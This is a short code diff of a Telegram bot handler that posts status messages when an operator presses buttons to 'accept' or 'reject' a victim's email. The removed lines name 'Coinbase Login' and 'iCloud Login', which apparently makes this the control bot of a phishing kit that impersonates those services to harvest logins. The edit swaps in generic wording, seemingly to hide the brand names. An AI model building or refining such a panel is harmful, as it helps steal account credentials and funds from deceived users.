@@ -304,9 +304,9 @@ bot.on("callback_query", async (query) => {
       } else if (action === "page2") {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "reject") {
-        statusMessage = `📧 <code>${email}</code> Coinbase Login <b>REJECTED</b>! ❌`;
+        statusMessage = `📧 <code>${email}</code> Has been <b>REJECTED</b>! ❌`;
       } else if (action === "page_accept") {
-        statusMessage = `☁️ <code>${email}</code> iCloud Login <b>ACCEPTED</b>! ✅`;
+        statusMessage = `☁️ <code>${email}</code> Has been <b>ACCEPTED</b>! ✅`;
         console.log(`✅ PAGE_ACCEPT matched! Message: ${statusMessage}`);
       } else if (action === "page_reject") {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
